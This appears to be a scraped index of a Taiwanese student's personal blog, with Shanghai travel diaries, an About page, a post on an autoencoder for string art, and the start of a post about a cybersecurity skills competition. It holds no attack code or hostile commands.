也是出現在這一帶的；最後一段就是從南京東路地鐵站到外灘一帶，這邊就偏高檔區，比如說一整排錶店、最顯眼的全季酒店就在這邊\n也是因為這趟旅程讓我認識 MINISO 和 POP MART，MINISO 感覺是賣很多周邊商品的店家，讓我覺得比較酷的是因為裡面甚至有馴龍高手和哈利波特，很慶幸在支付非常方便的情況下理性還是有克制住自己的手，沒有帶走一隻沒牙或嘿美回家，不過身旁的 Jo 似乎是快克制不住了\nCity Walk - 豫園 # 豫園是我在行前做功課時最想去的地方，首要原因是人工打造出的山水庭園感很吸我眼睛，其次是影片上看到過年期間金碧輝煌的豫園商場。不過商場真的有驚豔到我，相比在步行街覺得建築、招牌的排場很大，在豫園感受到的是為什麼銀樓這麼氣派，那邊的銀樓通常都是一整棟的，不然就是占據整個街角，而且不是偶爾出現一間，是整個商場內遍布，要說特色還是上海人真的喜歡逛這些金銀珠寶呢？\n走在豫園的九曲橋上，美是美，但讓我在這邊吐槽一下，可以不要在每個漂亮的地方都置入廣告嗎？這樣其實滿煞風景的\n我說的就是這個 \u0026hellip; 美中不足的是午餐，我們決定在附近的路邊攤簡單品嘗一些上海小吃再繼續行程，因為天氣實在是太熱了，我點的是雪梨銀耳湯，首先它好甜，再來它很小碗，最後一小碗要價 75 台幣，我覺得我被坑了，果然看評價、看人潮是很重要的。Jo 品嘗的是排骨年糕，我們以為上海的排骨年糕是合在一起的，就像 wikipedia 上的那張照片一樣，不過端上來似乎是開箱到另一個版本的排骨年糕，它不是排骨年糕，而是排骨．年糕，簡單來說他們是分開來的，炸排骨是炸排骨、炸年糕是炸年糕，也算是一個嘗試啦！\n最後還是決定付費參觀，看一下付費版本的豫園究竟多漂亮，和外面商場的差別就是裡面沒有商家、沒有推銷，只有滿滿的古物風景，人潮是一樣多，只是付費版豫園內部峰迴路轉，行走上更不容易了，但完全推薦第一次來豫園的人可以進來參觀一次！\nPrevious Nextsads 這邊留個小叮嚀：一開始我們以為豫園是要購票的，因為網路上一直講門票多少，是 bing 姐跟我們說上海這種景點都不需要門票，除了特別的區域以外，而通常這些區域也不完全到有花錢進去的價值，在外面逛免費的其實就可以了，所以就見仁見智，想進去的再現場買票也行，記得臺灣學生證是可以用的，學生票可以折 20 人民幣下去，還是有差的，如果發現售票的姐姐看到台胞證和臺灣的學生證有點措手不及，請給他們一些時間\nCity Walk - 陸家嘴 # 黃浦江西岸，也就是外灘，有著萬國建築博覽群，保留較多文化歷史感；浦東則是陸家嘴三件套，是現代化建設象徵，兩側差異頗大\n出了地鐵站，近看東方明珠覺得滿呆的，或許夜景的東方明珠會更有意思\n東方明珠塔 and 迪士尼旗艦店 路家嘴這邊有間迪士尼旗艦店，預期我們是要在這邊找到木須龍，但才發現裡面一點木蘭的東西都沒有，反觀動物方程式和史迪奇是最熱門的，不過旗艦店裡面最低消費金額是 99 人民幣，消費前還是要衡量一下！\nbing：你是鐵人吧！不坐也不喝水 bing：椅子！空調！冷氣！ 為了避暑最後在圓環上的天橋繞一繞拐進正大廣場，某種程度上來說也是為了內部的飲料店 aka 我們的上海手搖護照第一位霸王茶姬，霸王茶姬的人潮真的很多，這次就點很多人推薦的伯牙絕弦，我很喜歡霸王茶姬很重的茶味，霸王茶姬和一般飲料店不同的是使用三品管（最近是不是越來越多飲料店用三品管了？），網路科普一下是說三品管設計靈感來自品茶概念：「一品茶香、二品茶味、三品茶韻」，可以喝到不同層次，就像網路一旦限流就會體會到它的美好\n田子坊 # 上海田子坊的行程是因為米哈遊參訪的行程被取消而誕生的行程，剛好在日月光中心附近，所以吃飯前就進來晃了一圈。田子坊一開始應該是藝術家進駐形成的聚落，後來還是變成偏向一般老街性質，小店很多，但多少還是看的到一些些文創藝術感。bing 姐說上海的老街千篇一律，逛完豫園商場基本上其他地方都不太需要逛，就長那個樣子，到田子坊確實有這種感覺，千篇一律中展現自身風格的部分並不多\n日月光中心只是為了吃飯，它就是百貨公司，行前做功課的時候一直在想它跟我認識的日月光有沒有關係，走到大門口就確定一模一樣了，這個熟悉的 logo\u0026hellip;\nPrevious Nextsads 晚餐選擇的是害我們一直鬼打牆的紅脣麻辣拌，不知道為什麼看著高德地圖但一直找不到店家，一開始以為這是串燒店，但沒想到性質改了，變成選好要吃的串燒在選擇要拌麵還是湯麵，沒變的是都是辣的（扣分），我是不太吃麻醬麵的人，主要原因是我不喜歡麻醬的感覺，就像涼麵的醬也不喜歡，但這間不錯的地方是麻醬好吃，撇除會辣會燙以外，其實我還滿喜歡的，啊還有價格不划算，讓我回到臺灣物價，（喔你問多少嗎？24.3 人民幣，差不多 100 台幣，但就是跟之前享受的物價差很多），不過這種店本來就這樣\n五六點的上海和臺灣一樣艷陽高照，想看夜晚版本的琉璃藝術館還是一搓鬃毛而已，看不出燈光效果也拍不出好看的照片\n琉璃博物館 日間部 [在附近的藥局] Jo：請問這邊有正骨水嗎？ 店員：這裡沒有正骨水喔！（一臉疑惑） 超市 - 大潤發 # 兩萬五千里長征的 city walk 到晚上還沒停歇，回到延長路後我和 Jo 繼續往地鐵站附近的大寧國際商業廣場，主要是尋找 Pop Mart 和其他伴手禮，不知道為什麼總之在這邊看到大潤發有一種奇妙的感覺，一部分是驚訝原來這邊也有，一部分是驚訝它怎麼還沒改名大全聯，一部分是驚訝大潤發開在這種地方很不搭\n這也是這趟旅程學到的，不同地區的超市、雜貨店很值得進去逛一下，隨著地區的文化習慣不同，其實從這些日常生活會去的地方就能很明確看見當地人的習慣，像在大潤發裡面注意到除了飲食上的差異，另外就是超市 slogan 或一些警語，比如說海鮮區的警語在臺灣可能是「請勿動手」之類的，在那邊是寫「親～缸內有凶猛海鮮」，喜感剩餘警示意味\n","date":"2025-07-08","externalUrl":null,"permalink":"/posts/myfirstshanghai-d2/","section":"Blog Posts","summary":"大學階段的畢業旅行：初飛 X 探親。Day 2 說說 City Walk","title":"上海畢業旅行 - Day 2","type":"posts"},{"content":" 20250516 13:30 桃園國際機場 第二航廈集合\n學期第十八週出國其實是個賭注，很怕學校突然有事要處理，尤其這學期又身兼兩門課助教，果然出國前一天資安攻防演練第七第八次作業才剛截止，我必須在一個禮拜內改完作業、給大家確認完所有作業、考試的成績，才能讓老師時限內跑完後續流程\n上海畢旅：\u0026#x274c; 上海改作業：\u0026#x2b55; 對於候機室的想像 # 初飛的我想像中是候機時有個舒服的候機室可以休息，旁邊有杯咖啡可以配著，等待登機時刻，所以行前討論時就有跟 Jo 討論到這一環\n我：是說登機前是不是有個候機室啊？這樣我提早到是不是可以在裡面改作業？ Jo：候機室在很裡面餒，要拖運完行李、安檢完等待登機前才會到 我：ㄟ？是喔？但如果外面沒什麼事情了，提前進去是不是也可以啊？ Jo：對啊！我們可以早點處理完，讓你進去候機室改作業 我：好ㄟ！ 不過事實跟我想像不太一樣就是了，原來候機室就是有一排位置、有按摩椅、有廁所、有飲水機、有落地窗看飛機、有插座，沒了，或許我想像中的那個叫做貴賓室吧！不過看在有插座、有位置的份上，足夠讓我在登機前稍微整理一下需要批改的作業了，在這邊順便說明一下，資安攻防的最後兩次作業 HW07 和 HW08 分別是 VPN 和 path traversal 的 lab 設計，比較出乎意料的是 VPN 那份完成人數多到超出預期，原本是要在機場就完成批改所有作業，看到這麼多人寫作業，也只能分次批改了 :)\nCI506 航班 # 接下來是初飛者的所見所聞，所以會有很蠢的發現並對很 normal 的事情感到驚訝\nJo 在事前有跟我說，可以注意有沒有寫機上有的飲料，除了熱的飲品咖啡熱茶不要喝以外，其他有看到的都可以點，比如說薑汁汽水，不過這次航班只看到被說不要拿的就是了\n個人認為比較特別的有三件事情，一個是特殊飛機餐會先上，所以即便是經濟艙也會有 vip 感（這個人在做夢不要管他），一坐上去空姐就會過來問「是不是陳先生？有一個特殊餐點對嗎？」，餐點也會是該艙等數一數二先上的；第二個特別的是耳機吧！原來有些（有些？看到第五天就知道了）飛機的有線耳機是兩個孔的，而且剛好這班飛機的耳機孔是在手把，如果沒有旁邊乘客使用我可能要找好一陣子；最後就是飛機上的片單吧！其實我覺得滿新的，也滿懂多數人的口味，像是裡面就有吉伊卡哇，而且放眼望去是有一小部份的人在看的\n如果說耳機孔有兩個，是不是可以插進兩台手機裡面做混聲？\nPrevious Nextsads [降落前] 飛機：加速 我：？？？ [過一陣子] 機長：原定是準備降落，但因為前一班班機遇到鳥擊，所以跑到目前被占用中，我們會在上空再繞一圈等待塔臺告知可以降落時再行降落 我：（看一下時間）是不是提早了 ... 半個小時左右？ 下機後踏上上海這塊土地，又是陌生的開始，不過這次換兩個人都陌生了，畢竟兩個人都沒體驗過上海入境的流程，第一個尷尬的問題應該是入境要走外籍遊客還是中國公民吧！雖然怎麼想都覺得走中國公民就算錯了他們的立場也不能說我們有問題，好在公安很快就有告知我們怎麼走\nJo：請問拿台胞證的要走哪裡？ 公安：這裡，中國公民 跟預想的一模一樣！\n這邊第二次謝謝 bing 姐，差不多時間就透過微信問我們的狀況，甚至連網路可能翻不過去都設想好了，真貼心！\n地鐵 # 又是一個第一次，第一次嘗試上海地鐵，跟臺灣這邊對比應該比較像臺北捷運，除了舒適度、乾淨度、班次和禁止飲食這些規定像北捷以外，網路圖也是我認為相向的原因，上海地鐵有約 20 條路線，每條路線都會有一些與其他路線交會的轉乘站，比如我們第一天從機場出發的二號線轉往酒店的一號線就是在人民廣場站進行轉乘，不過上海地鐵的常見轉乘距離就比較像環狀線這樣超級遠，像上下樓層就可以到不同路線、甚至是同個月台會有兩條路線選擇的情況少之又少，或許是因為地鐵站人流龐大，要在小月台同時塞入這麼多人也不是件容易的事吧！\n相比下不一樣的點有兩個\n進出站透過支付寶乘車碼掃碼 其實就是透過各種行動支付方式付交通費，當然也有固定機台售票或是票卡式的支付方式，但大多數都是直接掃碼支付了 每次進站都要安檢 只要是揹後背包或手提一個大一點的袋子就要放上輸送到過安檢機器，雖然是偏麻煩，但可以看出中國對於安全性是非常重視的，可能很怕一個不小心放不該放的東西進去會出大事，從網路文章 來看似乎可以追溯至 2008 年北京奧運防止恐怖攻擊而設立的規定 這趟旅程同時也紀錄很多用語、語錄、廣播，其中一個便是地鐵站聽到的總總，就在這個章節一併分享\n「列車內嚴禁乞討、賣藝、兜售、散發小廣告等行為。使用電子設備時，禁止外放聲音。不得在列車車廂內飲食」 對我們而言，賣藝這件事情滿酷的，但根據 bing 姐所述，會這麼廣播就代表之前有人這麼做過 「出站的乘客請手持車票，依次通過閘機（炸雞）驗票口出站」 這句廣播似乎滿為人所詬病的，，就是因為那個閘機讓人很出戲 東方 ROSE 酒店 # 我們選擇酒店的規則大致如下\n四晚價格可以壓在 5000 新台幣 有 24 小時免費 Wi-Fi 供我改作業 可接受台胞證 看起來乾淨舒適 其實就是很基本的要求，唯獨第三點要特別注意，根據 bing 姐之前的敘述是有些酒店確實不收台胞證，如果事後才發現這種狀況，還要臨時找新的下榻處很麻煩，不過基本上正常的酒店是不會遇到這種問題的\nbing：你們如果不想花大錢住高級酒店，也不用擔心花低價會住到不好的酒店，因為會收台胞證的酒店通常都不會差到哪裡去，所以你們也沒這個命住到 這四個晚上我們選擇入住的是靜安區的東方 ROSE 酒店，交通方式就是搭乘地鐵一號線至延長路站，再走路差不多 10 分鐘，交通是滿方便的，周遭飲食也全不用擔心，以早餐來說，有一間長記油條，市場內應該還有更多，而且麵店其實早上就開始營業，往地鐵站的路上也有一間瑞幸咖啡；以正餐來說基本上店家 21:00 都還燈火通明，有些甚至營業到晚上 12 點，一路上很多麵店；以宵夜來說，23:00 以後還能看到老長沙臭豆腐、雞排等等；以手搖飲來說，附近有間蜜雪冰城；以夜生活來說，至少有兩間 bar，晚上人士真的頗多（注意這個幹嘛？）；以機能來說，酒店對面有全家、走道路口有雜貨店（好德），往地鐵站走也有很多雜貨店，也有一間大間的一掃光零食。推測是因為附近有上海大學，加上住宅區的關係，生活機能是很好的（不過大家不是都叫美團外賣嗎？）\n不過入住也是有遇到一些插曲，我們原本是透過 trip.com 這個網站預定，到現場才發現原來沒有刷成功，只是暫時保留而已，聽到這個消息是緊張的，主要是怕匯率漲了住宿費比預期貴，結果看了一下匯率應該是比預定當天便宜，不過加上國外交易手續費就更貴了 :(\n房間內部就一張大小可睡兩人的單（雙？）人床、一個圓桌、一張椅子、一臺電視、乾溼分離的浴室，馬桶是免治馬桶，我的房間比較奇特，第一個點是浴室滿小的，洗手台甚至在床邊，猜是建築格局的因素才這樣設計，不過個人覺得這個設計偏爛，第二個是不需要插房卡就可以用電，包含冷氣，第三點是窗戶關不起來，雖然因為窗簾很厚不影響冷氣使用，但說實話路邊的說話聲和全家開門鈴聲在晚上非常清楚，要說影響睡眠是絕對有的\n最後獨立出來說這間酒店的問題，也是我們一開始列條件沒注意到的：冰箱！這間酒店的房間沒有附冰箱，對於手搖飲、冰品或其他冰冰涼涼才好吃的點心非常不適合，可惜了\n晚餐：蘭州牛肉麵平型關路店 蛋炒飯 + 香菜湯 # Day 1 的晚餐是酒店附近的蘭州牛肉麵店，因為下榻時間差不多就八點半了，給我們放完行李收拾一下也差不多九點，剛好附近這家有素食又開到晚上 12 點，就成為我們的在上海的第一餐\n我點了一盤蛋炒飯，隨餐附上了一碗香菜湯，價格是 13 人民幣，換算台幣約 54 元，也算是符合我們心裡的期待，果真上海物價在這種非都會區還是便宜的，至少平常的一餐不用台幣 80 以上\n13 蛋炒飯 \u0026amp; 香菜湯 比較有趣的是在我們快吃完後，發現隔壁桌放了八盞茶，過一陣子又放上幾盤瓜子，頓時感覺到這間店等會會很熱鬧，再過一下連小蛋糕都出來了，老闆應該是新疆那一帶人，講話其實我們聽不太懂，猜測是同鄉準備開同樂會吧！\n不過確實酒店附近一帶似乎很多新疆人，從販賣一堆新疆烤羊肉串就猜得出來了\n蜜雪冰城 # 拿臺灣的飲料店對比，蜜雪應該是 Coco 的程度，差別是物價和賣的東西不太一樣，這次點的是新品蜜桃四季春，可能是因為新品特價的緣故，一杯只要差不多 32 台幣，認真覺得 Coco 要檢討一下，除了純茶很難找到這種物價了吧！\n店員：[驚慌失措貌] 蟲子啊！ Jo：[過去幫忙：揮拖把 + 徒手把蟲子抓下來] \u0026#x2714;\u0026#xfe0f; 每天一杯手搖飲 (1/5)\n改作業 # 第一天的最後一個行程是在睡前看看資安攻防第七次 VPN 的作業，沒想到的是有超過 20 個人交作業，這完全讓我沒辦法在短短一兩小時內改完，但有想到的是一定不乏直接使用 AI 產生的作業，雖然整份檔案都用 AI 產生著實有點過分，痕跡沒消除的更過分，但最後一次作業了，只要是正確的好像也沒辦法特別說什麼？\n這邊可以分享一個有趣的事情，一開始知道飯店網路一定會被牆，所以電腦開機後有特別試了幾個網站，像 overleaf、GitHub 就是完全可以正常運作的，不過為了從中國的牆內翻出來，除了在手機網卡下心思，對電腦就需要 VPN 來做到，記得是 Jo 說可以試試看拿學校 VPN 翻，因為曾經有人成功過，所以這次同時準備好師大和交大的 VPN，沒想到交大 VPN 一試就成功了，只能說偉哉交大，還沒入學就給我這等待遇！\n","date":"2025-07-07","externalUrl":null,"permalink":"/posts/myfirstshanghai-d1/","section":"Blog Posts","summary":"大學階段的畢業旅行：初飛 X 探親。Day 1 說說啟程的故事","title":"上海畢業旅行 - Day 1","type":"posts"},{"content":"歡迎來到這個小世界，我是 Luke，常用的 ID 除了 Luke 還有 April Aries 或它的簡寫 AA，因為我是一隻四月誕生的牡羊，四年前進資工系覺得大家都有自己的 ID 很酷，但要自己想卻想不到第一時間就適合且喜歡的，所以 AA 就一直使用到現在了\n目前是準國立陽明交通大學資訊安全研究所學生，剛從國立臺灣師範大學資訊工程學系畢業，曾經修習半個教育學程和 PASSION 偏鄉優質教育學分學程，主要研究領域在資訊安全，對滲透感興趣但什麼都打不下來\n這個網站會放上一些個人生活紀錄或競賽解題筆記。歡迎對我、對資安、對教育有興趣的人類們偶爾來看看\n學歷 # 國立陽明交通大學 資訊安全研究所 碩士 2025.09 - NOW 國立臺灣師範大學 學士 2021.09 - 2025.06 國立中央大學附屬中壢高級中學 高中 2018.09 - 2021.06 工作經歷 # 叡揚資訊股份有限公司 資安直屬事業處 實習生 2024.07 - 2024.12 教育經歷 # 113-2 資安攻防演練 助教 助教 2025.03 - 2025.06 113-2 程式設計（二） 助教 助教 2025.03 - 2025.06 遠距實習教師：花蓮縣立富里國中 [英文] PASSION 2025.03 - 2025.05 遠距實習教師：花蓮縣立萬榮國中 [數學] PASSION 2024.09 - 2024.12 暑期實習教師：花蓮縣立東里國中 [閱讀、數學] PASSION 2023.07 高中數學家教 家教 2023.03 - 2025.07 數位學伴：臺中市東汴國小 [數學] 數位學伴 2023.03 - 2023.06 獲優良大學伴 證照 # IPAS 初級資安工程師 IPAS 2025.01 分享 # 壢中小大學 校友分享 資工 2025.05.28 理學院實習成果發表會 實習 2024.11.21 暑期企業實習成果分享會 實習 2024.09.16 ","date":"2025-07-06","externalUrl":null,"permalink":"/about/","section":"About Me","summary":"","title":"About Me","type":"about"},{"content":"","date":"2025-07-06","externalUrl":null,"permalink":"/","section":"Luke's Blog","summary":"","title":"Luke's Blog","type":"page"},{"content":"看了 Sky 的個人網站，覺得 now 頁面的概念滿酷的，所以也仿照做一個\n20250706 網站搬遷中 # 網站搬遷中，目前 categories 頁面怪怪的，我會盡快修好！ ","date":"2025-07-06","externalUrl":null,"permalink":"/now/","section":"Now","summary":"","title":"Now","type":"now"},{"content":" 緣起 # 在沒有人邀約之前，或許我的大學畢旅會是暑假自己規劃個三天左右的獨旅，但在 Jo 的一個提議後，這趟旅程逐漸成形\n整趟旅程源自於這段對話 我們是高中社團的戰友，分別是副社、教學長和社長秘書，原本想要邀請比較熟識的社長大大和機動一起參加，可惜大家都有自己的規劃，於是這趟旅程就只有我們三個了，二女一男\n其實行前我一直思考該怎麼對這趟旅程下標，歐哈拉之旅、司法島拯救 bing 姐大作戰（好 \u0026hellip; 太中二了，但懂得都懂），但考量到這趟旅程集結了許多我的第一次，還是決定以 My First ShangHai 作為自己定義的旅程 title\n這是我第一次出國、第一次搭飛機、第一次踏入上海這趟土地、也因此第一次拿到護照、第一次辦台胞證、第一次開通行動郵局、第一次使用行動支付功能，很謝謝 Jo 整趟旅程對所有細節的叮嚀，還有 bing 姐這個稱職地陪\n準備 # D-0 來談談行前準備。我跟 Jo 和 bing 姐花了三四次的討論讓整趟旅程成形，這邊要先大力感謝 Jo 豐富的經驗帶領我這個初飛者從 0 到可以飛出國\n初飛去上海的好處應該就是生活、文化、語言等都很相近，加上上海市很發達的地區，不用特別擔心治安、衛生或其他不習慣的問題，飛行距離也很近，以初飛來說是滿適合的，剛好也有合到我對初飛的想像：不是日韓就是中國。但就缺點來說應該就是需要多申請台胞證吧！下面就來簡單談談行前準備\n關於護照 # 因為我是第一次出國，所以護照還需要另外申請，但因為護照跑戶政事務所就好，其實滿方便的，但光是護照就需要兩個禮拜左右，時間上要注意一下（拿 1300 買一個出境資格，這樣不出國都覺得浪費了）\n關於台胞證 # 護照完下一個是台胞證，台胞證需要找臺灣的旅行社辦，網路上其實可以找到很多，但價位並不一樣，相同的是都會比護照貴就是了，我找的是相對便宜的新中旅快簽，桃園在火車站附近，昊德樓上而已，因為他還提供免費拍照（據說護照和台胞證照片要不一樣，但櫃檯姐姐跟我說我新申請護照所以可以？），而且不用把護照收走，又滿方便可以到店，不過台胞證以 1500 的價位需要七個工作天，注意七個工作天不等於一個禮拜，遇到假日時間會順延，當然可以加價提早拿到，但我不要！\n關於網卡 # 台胞證完下一個處理的是網卡，這就是去上海的缺點了，去中國的網卡需要考慮能不能翻牆，如果找原電信公司，那倒沒什麼問題，畢竟電信公司如果還處理不好的話有愧於他是電信公司這項事實，但通常都要找去中國的網卡了，會賣得還沒考慮到這點也滿奇怪的。我是選擇辦理台胞證那間新中旅快簽，他們提供五天 499 的價錢，一天 3G，根據之前寒暑假整天抱手機的經驗，誇張一點一天也才 2G 左右，3G 是綽綽有餘，但保險一點我還是選擇多一些。中華電信也有提供那種海量型 10 天 15G，不過價錢稍微高個 100 左右，新中旅的方法是直接給一張 SIM 卡，到當地再插進去就好\n這邊偷偷抱怨一下，個人覺得新中旅是可以選擇的，不過服務態度不是很好，就是冷冷的跟你講話，覺得很多事情都應該了解，總之去兩趟都覺得沒有很舒服，尤其買網卡那次先跟我收錢就沒了，我還想說 SIM 卡式打算寄給我還是怎樣，結果是他忘記拿\u0026hellip;\n關於行動支付 # 比較重要的是支付，在中國沒有支付寶或微信支付會比較麻煩，畢竟行動支付再拿邊已經是主流了。不過我之前是完全沒使用過 * PAY 功能，為了這次還新開通 VISA 卡，綁定一大堆沒用過的功能，滿有趣的\n支付寶和微信支付其實差異不大，在那邊就是兩個不同派系而已，但走到哪裡都能使用，我們雖然使用支付寶，但微信或許會是更好的選擇，因為微信也是他們主流軟訊軟體，有點像 LINE 和 LINE PAY 的關係，不過初次使用微信的要注意幾件事情，一個是微信重載、換手機等都會讓紀錄不見，而且登入會要求兩個階段（我很喜歡但有點麻煩），第一次申請應該需要一個有在用微信而且開通微信支付三個月以上的人幫忙驗證，如果是臨時要用會很麻煩\n支付寶一開始一定要中國那邊的銀行卡才能綁定，是這幾年才有開放支援 VISA 卡的。而臺灣這邊也有支付寶，但限境外人士使用\n支付寶使用上有幾個要注意的地方，打開 app 上面有幾個按鈕是會用到的，一個是掃一掃，拿來掃店家的 QR code 並輸入金額，使用這個記得 NFC 要打開，我第一次在耍笨難怪店家的「碰一碰」沒用，另一個是境外支付，那是店家掃我的時候用的，第三個很重要，是境外出行，要先把所在的地方（比如上海）的付款碼打開，包含地鐵和公車\n關於 Apps # App 的部分除了微信、支付寶以外，我還有載高德地圖，使用 Google Map 的資訊還真的沒那麼仔細，高德可以看到比較詳細的內容，包含店家評價、菜單之類的，很可愛的是高德會在路上畫車輛，塞車的時候會在圖上表示出來。其實高德地圖和百度地圖應該也是不同派系而已，使用上還是差不多的\n攜程是他們綜合很多食衣住行育樂的 app，如果是購票、找資訊可以在上面滑滑看；大眾點評試著使用過，但要求中國手機號碼，所以不能用；美團是外賣，但沒用過不知道如何，不過美團就像我們這邊的 Uber Eat 或 Food Panda，當地人使用頻率很高\n最後以這趟旅程來說，會用到的就是迪士尼的 app，載這個主要就是當地圖和看排隊時間，有去迪士尼真的需要載下來\n","date":"2025-07-06","externalUrl":null,"permalink":"/posts/myfirstshanghai-d0/","section":"Blog Posts","summary":"大學階段的畢業旅行：初飛 X 探親。Day 0 說說準備期","title":"上海畢業旅行 - Day 0","type":"posts"},{"content":" 弦藝術 String Art Image # 弦藝術又被稱作 string art 或 thread art，是透過一條一條的線段組成的一幅畫，首先會有一個圓盤 (canva)，接著在圓盤周圍可以釘上幾個 pins，在 pin 和 pin 之間拉線 (pin-pair connections)，就會形成一幅肉眼可辨識的畫\n我從《我獨自升級》這部動漫中找了最經典的石像臉作為範例，並透過這個網站 畫出 string art image，string art image 在開始製作前會有預處理的步驟，也就是將圖片轉成灰階，並設定成特定尺寸。接著會開始在 pin 和 pin 之間拉線，如下圖，在經過 1000 條線之後，產生的 string art image 基本上可以粗略看到輪廓，但說要辨識出更詳細的資訊還有點困難，因此我再畫上 1000 條線，2000 條線的結果可以明確知道眼睛、鼻子和嘴巴，甚至牙齒的位置，臉型也有一點出來，到了 3000 條線，其實已經滿完美的了，很明確可以知道這就是 solo leveling 石像的臉，最後到了 4000 條線，可以更清楚的看見原本石像的紋路，雖然 4000 條線下顏色有點深，但更具立體感，這就是 string art image。\n根據實驗，這是在 canva 設為 1024 * 1024，圓周放上 288 個 pins的結果，可以猜測出來 string art image 在 canva 尺寸、pins 數量、線條數量改變的時候會有不同的效果，甚至可以調整線條粗細和顏色達到彩色的 string art image。\n所以 string art image 的問題其實就是給予一張原始圖片，要透過某個神奇的方法產生一張 string art image，當然有人針對這個問題進行研究過，第一個方法肯定是 brute force，但可以猜測到這非常沒有效率，所以後續有人針對數學性質、貪婪演算法或其他啟發式演算法，如基因演算法為主進行研究，嘗試有效率的產生 string art image。\n而這個問題其實也可以看成我要尋找一個函數，這個函數 input 一張原始圖片，我要 output 出 string art image，或簡單一點，我要找出 pin-pair connections 就好，那找函數正是 machine learning 在做的，但目前確實沒什麼人透過 machine learning 進行這方面的研究，因此我趁這次專題透過 autoencoder 尋找 string art image 這個問題需要的函數。\n實驗設計 # Autoencoder 的 model 會對 encoder 餵入訓練資料，產生一段 latent code，latent code 經過 decoder 會盡可能的產出類似原訓練資料的結果，這個流程其實很像 string art image 的產生過程：給予一張原始圖片，經過 encoder 產生一段 pin pairs connection，pin pairs connection 經過 decoder 要產生 string art image，且越接近原圖片越好。\n接著來細看我的實驗設計，input image 原本想要人臉，但因為人臉解析度比較高，訓練資料太大，所以換成 kaggle 上的 anime face dataset ，這個 dataset 有將近 21000 筆資料，每張 anime face 都被 resize 成 64 * 64；encoder 是一個 3 層的 CNN model，最後會產生一個 1 * 2000 的 latent code，這個 code 表示 string art image 上 1000 條線的連接關係，每兩個數值表示 canva 上的兩個 pin，彼此之間會拉起一條線。\n接著我會拿 latent code 丟到 decoder 裡面，decoder 是一個和 encoder 對稱的 3 層 CNN 模型，最後產生的結果並不會是 string art image，而是一張接近但不相同的圖片，就像一般 autoencoder 在做訓練時產生的東西一樣。所以我會同時拿 latent code 丟到一個既有的演算法中，這個演算法做的事情就是拿這些 pin pair connection 產出一張 string art image。\n接著是最核心的地方，我要怎麼衡量模型的好壞？當然和一般 autoencoder model 一樣拿 decoder output 和原圖做比較，我透過 MSE loss 去進行衡量，起初按照這樣的結果會發現 loss 從一開始就維持差不多 0.47，沒有特別上升或下降的幅度，就好像完全沒在訓練一樣，但仔細觀察這一步其實很奇怪，因為我根本不在意 decoder 的 output 長什麼樣子，反而是在乎 latent code 產生的 string art image，所以第二次實驗我同時考慮了 string art image，並透過 L1 loss 進行衡量，因為要求 string art image 和原圖長一樣是很過分的，比起每個 pixel 的衡量，應該更著重 圖片 structure 的相似度，衡量方法就是很簡單地把兩個 loss 加起來。\n實驗結果 # 圖顯示 epoch = 10, 20, 30 以及 40 的情況，loss 標註在旁邊，可以很清楚的看到根本分辨不出來這是什麼，但在前 40 個 epochs 的 loss 變化雖然一直往下，但幅度非常的小，整體來說結果並不是很好\n我簡單分析了幾個可能的原因\n可能和 input dataset 有關，畢竟原圖只有 64 * 64 的解析度，在產生 string art image 的時候，因為更難解析原圖的結構，所以不容易產生好的 pin pairs connection，但這是訓練過程應該學到的事情，應該不是主要問題 output string art image 的尺寸也是一個原因，為了讓模型能持續跑在 google colab 上，我將 size 設為 512 * 512，pins 數設為 288，線條粗細調整到最細，但在這張 canva 上畫了 1000 條線很有可能讓整張圖片都變成全黑的，那在判斷 loss 的時候，確實就沒什麼好判斷的，就像全黑的圖和原圖做比較，每次比出來的結果都是一樣的，至於為什麼我不增加 output string art image size，因為如果增加這個模型跑到一半就會噴 running out of RAM 並停止，算是硬體設備上的不足 僅使用 1000 條線在最前面介紹 string art image 的時候有提到並無法好好呈現原圖的長相，也有可能是因為這個緣故，讓衡量圖片好壞時效果不彰。 最後當然就是訓練期間太短，前一頁顯示的結果到 40 個 epochs，這個訓練期間差不多需要 8 個小時，但因為 loss 下降幅度並不高，當時就停止了，如果訓練期間在拉長應該也能看到稍微好一些的結果，但我不認為這是主要原因 總而言之，會造成實驗失敗的主因應該會是第二項與第三項\n結論 # 這份專題的貢獻當然是前衛的提出透過機器學習的角度解決 string art image，但不幸失敗收場。或許這也可以反思為什麼沒人要透過機器學習解決這類問題，如果數論或其他貪婪演算法就能有效的解決，且維持不錯的品質，那訓練一個模型，可能因為圖片不再是人臉，換成風景圖，或其他因素導致使用模型的 target 不適合，產出結果不會像現存的解決方案這麼好，可能不是這麼划算的解決方案。\n未來研究方向的部分，一個當然是提升硬體設備，在足夠的算力與時間成本下，進行完整的訓練，並將 input 與 output image 的解析度調高，讓 loss evaluation 可以正確比較，第二個就是嘗試不同模型，這次雖然使用 autoencoder，但可以從整體架構，或是撤換 encoder 或 decoder 的模型、調整參數來實驗，最後就是 loss function 的使用，不僅僅是替換 MSE 和 L1 loss，也可以調整兩者之間的比例，例如將 string art 的 loss 給予 7 成的權重，而 decoder output 給予 3 成，來更著重 string art image 的成果\n","date":"2025-05-03","externalUrl":null,"permalink":"/posts/string-art-generation-using-autoencoder/","section":"Blog Posts","summary":"","title":"透過 autoencoder 模型產生弦藝術","type":"posts"},{"content":"","date":"2025-04-23","externalUrl":null,"permalink":"/tags/writeup/","section":"Tags","summary":"","title":"Writeup","type":"tags"},{"content":" 緣起 # 一切是從上學期第二堂高等資安攻防演練講師：前國手 Mico 大力宣傳，種下了技能競賽的種子，某種程度上這也算是一個資安屆的殿堂，就算沒坐在高位，曾經進到裡面也一定有收穫\n第二次接觸是去年 (2024) 看到的大消息：海豹成為第 47 屆網路安全國際技能競賽銅牌得主，再一次接觸到技能競賽的名詞\n第三次就是參加 2024 HITCON CTF 暨菁英人才交流活動，又遇到 Mico 給他安麗了一下\n第四次就是看到報名消息，毅然決然決定組隊報名，於是展開了一段我獨自升級的旅程（啊不過是兩個人）\n0327 Day1 淘汰賽 # 規定是說北區超過 18 組就要進行淘汰賽，北區這次有 22 組選手報名，所以會在第一天就先進行淘汰賽篩選掉來體驗的 4 組選手\n淘汰賽採紙本進行，40 道單選題，一題 2.5 分，答錯倒扣 0.5，同分以先繳交者獲勝，賽前我們很認真地計算過了，假設題目超級難，那每題答對的機率是 1/4，在每題都寫的情況下得分期望值為 2.5 * 10 + (-0.5) * 30 = 10 分，成績 range 就是 -20（來亂的） 到 100\n淘汰賽考什麼？滿出乎意料的是範圍很雜，原本以為主辦方會想從淘汰賽測試選手的資訊概論能力，包含網路概念：TCP/IP Model、protocols 